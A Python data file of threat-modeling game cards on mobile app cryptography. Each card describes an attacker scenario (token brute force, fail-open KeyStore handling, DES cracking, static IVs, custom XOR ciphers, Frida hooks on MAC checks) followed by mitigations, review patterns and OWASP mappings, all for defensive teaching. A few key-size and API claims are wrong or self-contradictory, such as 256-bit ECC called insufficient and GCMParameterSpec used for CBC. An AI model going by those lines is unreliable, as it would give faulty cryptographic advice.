CARDS["cryptography/CRM8"] = {
"explanation": """\
## Scenario: Adel can predict and use the app's cryptographic keys because they are insufficiently long and random, can be enumerated, or are derived from known values

Consider a scenario where Adel discovers the app generates 64-bit session keys using a CSPRNG. At first, this sounds acceptable — until Adel notes that the app is used by millions of users simultaneously. With 2^64 possible keys, a birthday attack at 2^32 operations has a 50% chance of finding a collision. With modern hardware generating millions of session tokens per second across a botnet, a collision-based attack becomes practical. The key length was secure for the 1990s.

1. 56-bit DES keys, 64-bit tokens, and 128-bit RSA keys do not meet current security standards.
2. Keys derived from user IDs, device serial numbers, or other enumerable values are not truly random.
3. PBKDF2 with a low iteration count (< 100,000 for 2024 hardware) reduces the cost of brute-force key derivation.

### Example

Adel finds the app's session tokens are 8 characters of alphanumeric (62^8 ≈ 2^47.6 possibilities). He runs a distributed enumeration attack across 10,000 devices, each generating 1 million token candidates per second. In about 2 days, he has found a valid active session token. The token entropy was too low for the threat model. A 128-bit token (22 alphanumeric characters) would have made this attack infeasible.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Spoofing**.

Insufficiently long or predictable keys can be enumerated or brute-forced, allowing an attacker to discover the key and either decrypt protected data or forge authenticated messages.

### What can go wrong?

- Short session tokens are brute-forced to find valid active sessions.
- Keys derived from enumerable inputs are predictable.
- Low PBKDF2 iteration counts allow offline brute-force of user passwords.
- 1024-bit RSA and 256-bit ECC keys provide insufficient security margins against modern cryptanalysis.

### What are we going to do about it?

- Use at least 128-bit keys for symmetric encryption (AES-128 minimum; AES-256 preferred for sensitive data).
- Use at least 2048-bit RSA keys (3072-bit or 4096-bit preferred); use at least 256-bit ECC keys.
- Generate session tokens with at least 128 bits of entropy from a CSPRNG.
- Configure PBKDF2 with at least 600,000 iterations for SHA-256 (NIST 2023 recommendation); use Argon2id for new implementations.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- AES key size: `KeyGenParameterSpec.Builder(alias, PURPOSE).setKeySize(256)` for AES-256.
- RSA key size: `KeyPairGenerator.initialize(KeyGenParameterSpec.Builder(alias, PURPOSE).setKeySize(3072))`.
- Session tokens: `SecureRandom().generateSeed(16)` provides 128-bit entropy; Base64-encode for use as a token string.
- PBKDF2: `PBEKeySpec(password, salt, 600000, 256)` with `SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")`.

**iOS**
- `CryptoKit.SymmetricKey(size: .bits256)` for AES-256.
- `SecKeyCreateRandomKey` with `kSecAttrKeySizeInBits: 4096` for RSA; or use ECC P-256/P-384.
- `SecRandomCopyBytes(kSecRandomDefault, 16, bytes)` for 128-bit session tokens.
- Argon2id: use a vetted Swift/C library; CryptoKit does not include Argon2 natively.

**Testing**
- Review all key sizes against NIST SP 800-57 recommendations.
- Check PBKDF2 iteration counts against current hardware benchmarks.
- Review session token lengths for sufficient entropy against the expected number of concurrent active sessions.

**OWASP Mappings**
- MASVS: CRYPTO-1, CRYPTO-2
- MASTG: TEST-0013, TEST-0016, TEST-0061, TEST-0063, TEST-0204, TEST-0205, TEST-0208, TEST-0209, TEST-0309, TEST-0310, TEST-0311, TEST-0349
- MASWE: MASWE-0009, MASWE-0010, MASWE-0022, MASWE-0027
"""
}

CARDS["cryptography/CRM9"] = {
"explanation": """\
## Scenario: Fady can bypass cryptographic controls because they do not fail securely — they default to unprotected mode

Consider a scenario where Fady discovers the target app has an encryption module that, when it encounters an exception from the `KeyStore` (key not found, hardware error), catches the exception and returns the original plaintext data unmodified. The developer's intention was "graceful degradation." The result is that any condition causing a `KeyStore` failure — including a condition Fady can induce — results in sensitive data being returned in plaintext. The encryption fails open.

1. Catching cryptographic exceptions and continuing without encryption defaults to unprotected behaviour.
2. A `try { decrypt() } catch (Exception e) { return data; }` pattern is a classic fail-open cryptographic implementation.
3. Unavailability of the hardware security module resulting in plaintext fallback defeats hardware-backed security.

### Example

Fady triggers a `KeyStoreException` by deleting the app's `KeyStore` key entry using a root file manager. The app's encryption module catches the exception and returns the data unmodified (plaintext). Fady now has direct access to all data the app had "encrypted." The developer's fallback intent was "continue operating even if encryption fails." The secure intent would have been "fail closed: refuse to operate if encryption fails."

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Spoofing**.

A fail-open cryptographic control means that any condition — hardware error, key deletion, induced exception — that causes the cryptographic operation to fail results in the protected data becoming accessible in plaintext.

### What can go wrong?

- Inducing a key error causes the app to return plaintext data instead of failing.
- Hardware errors in the secure element result in plaintext fallback, bypassing hardware-backed security.
- Exception handling logic that catches all exceptions and continues causes cryptographic operations to silently fail.

### What are we going to do about it?

- Cryptographic controls must fail closed: if the decrypt operation fails, the data must not be returned in any form.
- Propagate cryptographic exceptions to the caller; do not catch and swallow them.
- If the cryptographic key is unavailable, display an error and require re-authentication or re-setup; do not fall back to plaintext.
- Test fail-closed behaviour explicitly: delete the key and verify the app refuses to return the data.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Do not catch `KeyStoreException`, `UnrecoverableKeyException`, or `InvalidKeyException` and continue without the key.
- Correct pattern:
  ```kotlin
  val decrypted = try {
      cipher.doFinal(ciphertext)
  } catch (e: AEADBadTagException) {
      throw SecurityException("Decryption failed: data integrity check failed", e)
  }
  // Only use decrypted if no exception was thrown
  ```
- Handle `KeyPermanentlyInvalidatedException` by prompting the user to re-enrol biometrics and re-encrypt data with a new key — not by returning plaintext.

**iOS**
- `SecKeyDecrypt` / `CryptoKit.AES.GCM.open` failure: propagate the error to the caller; do not return the original ciphertext or plaintext.
- `SecItem` not found (`errSecItemNotFound`): prompt for re-authentication or re-setup; do not fall back to unprotected storage.
- `AES.GCM.SealedBox.init` throws on authentication failure: always check for this error and handle it as data corruption/tampering, not a transparent fallback.

**Testing**
- Delete the app's `KeyStore` / Keychain key entry; verify the app refuses to return plaintext data.
- Induce a `KeyStoreException` by revoking the key; verify the app displays an error and requires re-authentication.
- Review all `try/catch` blocks around cryptographic operations for incorrect fallback behaviour.

**OWASP Mappings**
- MASVS: CRYPTO-1
- MASTG: TEST-0014
- MASWE: (see MASVS references above)
"""
}

CARDS["cryptography/CRMX"] = {
"explanation": """\
## Scenario: Ash can break the cryptography because it is not strong enough according to what is recommended or the perceived effort of a potential attacker

Consider a scenario where Ash discovers the app uses DES (56-bit key, effectively ~57 bits of security) for data encryption. Modern hardware can brute-force DES in under 24 hours. The algorithm was retired by NIST in 2005. The developer had chosen it because it was available in the legacy Java `Cipher` API and "it was already there." Ash breaks the encryption and reads all stored user data.

1. DES, 3DES (TDEA), RC4, MD5, and SHA-1 are deprecated algorithms that no longer meet current security requirements.
2. Using short key lengths (1024-bit RSA, 512-bit ECC, 128-bit AES for post-quantum scenarios) provides insufficient security margin.
3. Relying on "it was the default" without checking current recommendations leads to the use of deprecated algorithms.

### Example

Ash finds the app uses `Cipher.getInstance("DES/ECB/PKCS5Padding")`. He captures 200 bytes of ciphertext from a network response. He uses a DES brute-force tool (cloud-based, approximately $50 for the required computation) and recovers the plaintext within 18 hours. The developer's choice of DES was motivated by copy-pasting a Stack Overflow answer from 2006. The answer was wrong then too.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Weak cryptographic algorithms can be broken with resources available to motivated attackers, rendering the cryptographic protection ineffective.

### What can go wrong?

- Data encrypted with DES/3DES is recoverable with modest computational resources.
- MD5-hashed passwords are reversible using precomputed rainbow tables.
- RC4-encrypted traffic is recoverable using known statistical attacks.
- SHA-1 collisions enable certificate or document forgery.

### What are we going to do about it?

- Use AES-256-GCM or ChaCha20-Poly1305 for symmetric encryption.
- Use SHA-256, SHA-384, or SHA-512 for hashing; SHA-3 for new implementations.
- Use RSA with 3072-bit keys (or 4096-bit); prefer ECDSA P-256 or P-384 for signatures.
- Use Argon2id for password hashing; bcrypt or scrypt as alternatives.
- Review all cryptographic algorithm choices against current NIST SP 800-131A recommendations.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Deprecated Algorithms (never use)**
- Symmetric: DES, 3DES/TDEA, RC4, RC2, Blowfish (for new implementations), AES-ECB
- Hash (for security): MD5, SHA-1 (acceptable only for non-security checksums with awareness)
- Asymmetric: RSA < 2048-bit, DSA < 2048-bit, ECC < 224-bit

**Approved Algorithms (current)**
- Symmetric encryption: AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305
- Hash: SHA-256, SHA-384, SHA-512, SHA-3 (256/384/512)
- Password hashing: Argon2id (preferred), bcrypt, scrypt
- Asymmetric: RSA-3072+, ECDSA P-256/P-384, Ed25519

**Android**
- `Cipher.getInstance("AES/GCM/NoPadding")` — correct.
- `MessageDigest.getInstance("SHA-256")` — correct for non-password hashing.
- Static analysis: grep for `DES`, `RC4`, `MD5`, `SHA1` in `Cipher.getInstance`, `MessageDigest.getInstance`, `Mac.getInstance`.

**iOS**
- `CryptoKit.AES.GCM`, `CryptoKit.ChaChaPoly` — AEAD ciphers.
- `CryptoKit.SHA256`, `SHA384`, `SHA512` — approved hash functions.
- CommonCrypto: avoid `kCCAlgorithmDES`, `kCCAlgorithm3DES`; use `kCCAlgorithmAES`.

**OWASP Mappings**
- MASVS: CODE-3, CRYPTO-1
- MASTG: TEST-0013, TEST-0014, TEST-0061, TEST-0210, TEST-0211, TEST-0221, TEST-0232, TEST-0312, TEST-0317, TEST-0350
- MASWE: MASWE-0019, MASWE-0020, MASWE-0021, MASWE-0023
"""
}

CARDS["cryptography/CRMJ"] = {
"explanation": """\
## Scenario: Hassan can extract or modify sensitive data because functions for storage and/or encryption are weak, deprecated, or used incorrectly

Consider a scenario where Hassan finds the app uses AES-CBC with a static IV. The IV is always the same 16-byte value, copied from a constant in the code. Two plaintexts encrypted with the same key and same IV produce ciphertext blocks that are identical for identical plaintext prefixes — allowing an attacker who can observe multiple ciphertexts to infer information about the plaintexts. The developer had set the IV to all zeros "for simplicity."

1. A static IV with AES-CBC creates a deterministic cipher; identical plaintext prefixes produce identical ciphertext blocks.
2. Using an IV that is shorter than the required 16 bytes, or zero-padded, reduces the effective randomness.
3. Using `AES/ECB/PKCS5Padding` instead of `AES/GCM/NoPadding` as a "simpler" alternative loses integrity protection and leaks plaintext structure.

### Example

Hassan captures 100 ciphertext blocks from different users' encrypted profiles. Each profile starts with `{"name":"`. Because the IV is static, the first ciphertext block is always the AES-CBC encryption of `{"name":"` XOR `IV`. Since `IV` is constant, the first ciphertext block is the same for all users with profiles starting with the same 16 bytes. Hassan uses this to identify accounts with the same name prefix — and then confirms specific values by testing known plaintexts. The AES implementation was correct. Its use was not.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure**.

Incorrect use of cryptographic functions — even correct algorithms used with incorrect parameters — can expose plaintext structure, enable known-plaintext attacks, or make the encryption deterministic and therefore guessable.

### What can go wrong?

- Static IV enables determination of plaintext structure from ciphertext patterns.
- ECB mode leaks block-level plaintext repetitions.
- Re-used nonces in GCM mode expose the authentication key, breaking both confidentiality and integrity.
- PKCS#1 v1.5 RSA padding is vulnerable to Bleichenbacher's oracle attack.

### What are we going to do about it?

- Always generate a fresh random IV/nonce for each encryption operation: `SecureRandom().nextBytes(iv)`.
- Never reuse a nonce with the same GCM key.
- Store the IV alongside the ciphertext for decryption (the IV is not secret).
- Use RSA-OAEP padding instead of PKCS#1 v1.5 for asymmetric encryption.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- CBC: generate IV with `SecureRandom().nextBytes(iv)`; store as `IV || ciphertext`; extract on decryption with `GCMParameterSpec(128, iv)`.
- GCM: `GCMParameterSpec(128, nonce)` — 96-bit nonce, fresh per-message, never reused.
- RSA: `Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding")` — OAEP padding.
- Static analysis: grep for `IvParameterSpec(new byte[16])` (zero IV), `new byte[]{0,0,...}` used as IV.

**iOS**
- `CryptoKit.AES.GCM.seal(_:using:)` without specifying a nonce generates one automatically — this is the safe default.
- `AES.GCM.Nonce()` generates a random nonce; `AES.GCM.Nonce(data:)` with a fixed value is dangerous.
- CommonCrypto CBC: `CCCrypt` requires an IV parameter; never pass a fixed constant; generate with `SecRandomCopyBytes`.

**Testing**
- Encrypt the same plaintext twice with the same key; verify the ciphertexts are different (random IV/nonce).
- Inspect IV extraction from stored ciphertexts; verify IVs are unique across different encryption operations.
- Test with a Padding Oracle attack against PKCS#1 v1.5 RSA implementations.

**OWASP Mappings**
- MASVS: CODE-3, CRYPTO-1, CRYPTO-2, STORAGE-1
- MASTG: TEST-0001, TEST-0013, TEST-0014, TEST-0052, TEST-0061, TEST-0210, TEST-0211, TEST-0221, TEST-0232, TEST-0312, TEST-0317, TEST-0350
- MASWE: MASWE-0015, MASWE-0019, MASWE-0020, MASWE-0021, MASWE-0023
"""
}

CARDS["cryptography/CRMQ"] = {
"explanation": """\
## Scenario: Simon can bypass hashing and encryption functions because they are custom-written and/or inadequately implemented

Consider a scenario where Simon decompiles the app and finds a `customEncrypt(data, key)` method that XORs each byte of the data with the corresponding byte of the key, cycling through the key. He recognises this as a stream cipher with a short, repeating key. By XORing two intercepted ciphertexts produced with the same key position, the key cancels out and he can recover the XOR of the two plaintexts. With some known plaintext, he recovers the full key. The custom encryption was novel. It was also broken.

1. Custom cryptographic implementations almost always have weaknesses not present in vetted standard algorithms.
2. "Rolling your own crypto" replicates implementation errors that the cryptographic community has spent decades identifying and addressing.
3. Inadequately implemented standard algorithms (e.g., incorrect padding, missing IV, truncated MAC) can be as weak as custom algorithms.

### Example

Simon finds the app hashes passwords using a custom function: `hash = password.length + sum(bytes)`. Two different passwords can produce the same hash trivially. Simon finds a user whose hash is 1042 and submits "a" × 1042 as the password. The authentication accepts it. The custom hash function has catastrophic collision resistance. The developer had not studied cryptography; the developer had studied addition.

## Threat Modeling

### STRIDE

This scenario falls under **Information Disclosure** and **Spoofing**.

Custom or inadequately implemented cryptographic functions are almost always weaker than standard implementations, enabling an attacker to bypass the cryptographic protection or forge cryptographic values.

### What can go wrong?

- Custom hash functions with trivial collisions allow authentication bypass.
- Custom stream ciphers with repeating keys are recoverable from ciphertext-only.
- Incorrect padding implementation leaks information through timing or error responses.
- MAC truncation below 128 bits reduces resistance to birthday attacks.

### What are we going to do about it?

- Use industry-standard cryptographic libraries (Android Keystore / CryptoKit / BouncyCastle / libsodium) without modification.
- Never implement cryptographic primitives from scratch; the risk of subtle, exploitable errors is very high.
- If a standard algorithm is used, use it with the default, recommended parameters; do not modify the algorithm or its parameters.
- Have all cryptographic design and implementation reviewed by a cryptographer before deployment.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- Use `javax.crypto` / `java.security` providers backed by `AndroidKeyStore` or `BouncyCastle`.
- Use `MessageDigest.getInstance("SHA-256")` — not a custom hash.
- Use `Mac.getInstance("HmacSHA256")` — not a custom HMAC.
- Static analysis: grep for `XOR`, `ROL`, `ROT`, custom loop-based `encrypt`/`hash` methods, bit-manipulation on byte arrays adjacent to crypto operations.

**iOS**
- Use `CryptoKit` (iOS 13+) for all new cryptographic operations: AES.GCM, ChaChaPoly, HMAC, SHA256/384/512, P256/P384/P521.
- CommonCrypto is acceptable for AES, HMAC, SHA-256; do not use it to implement custom modes.
- libsodium is a vetted, high-level cryptographic library for scenarios not covered by CryptoKit.

**Design Review**
- Any novel cryptographic construction (combining standard primitives in a custom way) requires external cryptographic review before production use.
- "Encrypt-then-MAC" and "AEAD" are the only safe authenticated encryption constructions; all others require expert review.

**OWASP Mappings**
- MASVS: CODE-3, CRYPTO-1
- MASTG: TEST-0014, TEST-0061, TEST-0211
- MASWE: MASWE-0019, MASWE-0021
"""
}

CARDS["cryptography/CRMK"] = {
"explanation": """\
## Scenario: Tarik can influence or alter cryptographic operations and can therefore bypass them

Consider a scenario where Tarik has identified that the app's MAC verification function, `verifyMAC(data, mac)`, returns a boolean. He hooks the function with Frida and overrides the return value to `true`. The app proceeds as if the MAC was valid, even though Tarik has submitted arbitrary data with a forged MAC. The cryptographic operation was correct. Its result was overridden at the software level.

1. Cryptographic verification results stored as booleans or simple return values can be overridden by runtime instrumentation.
2. MAC and signature verification logic that can be hooked and overridden defeats the purpose of the verification.
3. Cryptographic operations performed outside the hardware security boundary are manipulable by anyone with process access.

### Example

Tarik uses Frida to hook `MessageDigest.isEqual(computedMAC, receivedMAC)`. He overrides the return value to `true` for all calls. The app's integrity-check logic accepts all data as authenticated. Tarik submits modified API responses with forged MACs. The app processes them as legitimate. The MAC algorithm was HMAC-SHA256 with a hardware-backed key. The verification result was a boolean in application memory.

## Threat Modeling

### STRIDE

This scenario falls under **Tampering** and **Spoofing**.

By overriding the cryptographic verification result, Tarik can make the app accept modified or forged data as authentic, bypassing the integrity and authenticity guarantees the cryptographic operation was intended to provide.

### What can go wrong?

- Modified data passes MAC/signature verification after hook injection.
- Forged certificates or tokens are accepted after verification override.
- The entire cryptographic security model depends on a single hookable boolean comparison.

### What are we going to do about it?

- Use the result of cryptographic operations directly rather than a boolean derived from them: let the decryption fail (throw an exception) if the MAC is invalid, rather than checking a boolean.
- For AES-GCM, `cipher.doFinal()` throws `AEADBadTagException` if the tag is invalid; this is not a boolean that can be overridden.
- Apply runtime integrity checks to detect Frida/hooking frameworks as a defence-in-depth measure.
- Use hardware-backed cryptographic operations (Secure Enclave / StrongBox) where the result is determined by hardware, not software-manipulable code.
""",
"technical_note": """\
## Platform-Aware Review Guidance

**Android**
- AES-GCM: `cipher.doFinal(ciphertext)` throws `AEADBadTagException` on authentication failure — this exception cannot be overridden by hooking `doFinal` to return a boolean, because the exception propagation itself would need to be suppressed.
- `MessageDigest.isEqual()`: a constant-time comparison; hookable, but hooking it is harder to suppress cleanly. Prefer AEAD modes over separate MAC verification.
- Detect Frida: check for `/data/local/tmp/frida-server`, unusual named pipes, and `frida` in `/proc/self/maps`.

**iOS**
- `CryptoKit.AES.GCM.open(_:using:)` throws on authentication failure; the throw must be caught and suppressed for the bypass to work — this is detectable.
- Secure Enclave signature verification: `SecKeyVerifySignature` — the verification is performed in hardware; the result propagation through the software stack is hookable but requires more sophisticated attack.
- Detect Frida/Substrate: scan `_dyld_get_image_name` for known injection library paths.

**Testing**
- Hook the MAC/signature verification function with Frida and override the result; verify the app's AEAD exception is not suppressible (i.e., the app throws before the override is effective).
- Test with Frida: override `AEADBadTagException` suppression and verify the app still rejects the data (ideally by crashing or returning an error).

**OWASP Mappings**
- MASVS: CODE-4, CRYPTO-1, CRYPTO-2
- MASTG: TEST-0014, TEST-0061, TEST-0062
- MASWE: MASWE-0016
"""
}

CARDS["cryptography/CRMA"] = {
"explanation": """\
## Ace: You have invented a new attack against "Cryptography"

This card invites your team to explore novel cryptographic threats specific to your app's design and threat model.

### What does this card ask you to do?

Invent a realistic new threat in the Cryptography domain not already represented by CRM2 through CRMK. Consider:

- **Post-quantum preparedness:** Your app uses RSA or ECC for key exchange. CRQC (Cryptographically Relevant Quantum Computers) are not yet available, but what happens when they are? Is your app's key exchange algorithm quantum-resistant?
- **Protocol-level issues:** Your app implements a custom authentication protocol using standard primitives. Is the protocol composition secure? (Many protocols composed of secure primitives are themselves insecure.)
- **Key lifecycle gaps:** Your app rotates encryption keys, but what happens to data encrypted with an old key after rotation? Is it re-encrypted, or does the old key persist indefinitely as a "legacy" key?
- **Side-channel leakage in native code:** Timing, power, or electromagnetic emanations from native cryptographic operations — relevant for high-security on-device operations.
- **Cryptographic agility failures:** Your app allows the client to specify the algorithm. What happens if the client requests a weak or deprecated algorithm?

### How to play this card

1. **Nominate a threat:** Propose a specific, plausible cryptographic vulnerability not covered by other CRM cards.
2. **Name the attacker and victim:** What cryptographic assumption do they violate?
3. **Classify the threat (STRIDE):** Cryptographic attacks most often result in Information Disclosure.
4. **Assess likelihood and impact:** Is this realistic for your app's threat model and expected attacker capabilities?
5. **Propose a mitigation:** What design or implementation change reduces the risk?
6. **Score the card:** A well-formed novel threat earns full points.

### Example starting prompts

- "Our app uses ECDH for key exchange. What if the server or client sends a malicious point not on the curve (invalid curve attack)? Does our implementation validate the point?"
- "Our app stores encrypted data and supports key rotation. When a user changes their PIN, is the old key securely destroyed, or does it persist in the KeyStore under the old alias?"
- "Our app accepts the hash algorithm as a parameter in a JWT header. What if an attacker substitutes `none` or `HS256` for `RS256` (algorithm confusion attack)?"

## Threat Modeling

### STRIDE

Varies by the invented attack. Most cryptographic attacks result in Information Disclosure or Spoofing.

### What can go wrong?

Cryptographic protocols and implementations have subtle failure modes that are not always visible in code review. Novel attack research regularly reveals weaknesses in apparently secure implementations. Threat modeling must keep pace with published research.

### What are we going to do about it?

- Validate the invented threat against current NIST SP 800-series guidance and OWASP MASTG.
- Consider engaging a specialist cryptographic reviewer for complex protocol designs.
- Document the threat and the agreed mitigation in the team's threat model register.
""",
"technical_note": """\
## Guidance for Novel Cryptography Threats

**Common areas for novel attacks**
- Post-quantum migration: RSA/ECC key exchange, NIST PQC algorithm selection (ML-KEM, ML-DSA).
- Cryptographic protocol composition: is the combination of primitives provably secure, or does it have interaction weaknesses?
- Key lifecycle: rotation, revocation, re-encryption of historical data.
- Side-channel leakage in timing-sensitive native cryptographic operations.
- Algorithm agility: client-specified algorithms, JWT header manipulation.

**Framing the attack**
- Which cryptographic assumption does the attack violate (confidentiality, integrity, authenticity, non-repudiation)?
- What attacker capability is required?
- What is the impact of a successful attack?

**Mapping to standards**
- NIST SP 800-57 (key management), NIST SP 800-131A (algorithm transitions)
- OWASP MASTG Cryptography chapter
- MASWE: check for an existing weakness entry

**OWASP Mappings**
- MASVS: determined by the invented threat
- MASTG: determined by the invented threat
- MASWE: determined by the invented threat
"""
}

